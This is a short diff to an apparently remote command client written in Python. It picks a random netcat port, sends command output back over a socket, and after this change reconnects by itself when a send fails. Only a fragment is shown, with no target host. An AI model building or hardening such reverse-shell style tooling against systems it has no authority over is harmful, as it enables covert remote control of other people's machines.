@@ -113,7 +113,7 @@ except:
     pass
 
 NCPORT = random.randint(8000,9000) #Picks a random port between 8000-9000
-if NCPORT == 8080:
+if NCPORT == SERVER_PORT:
     NCPORT = 8081
 #Assume the client has netcat installed. If they don't, then just skip this step.
 try:
@@ -225,7 +225,10 @@ def clientLoop():
             message = f"{output}" #encapsulate the output and send it
             s.send(message.encode())
         except Exception as e:
-            s.send("Error on client side.".encode())
+            try:
+                s.send("Error on client side.".encode())
+            except:
+                clientLoop()
 
 #If anything breaks, just reset the connection
 try:
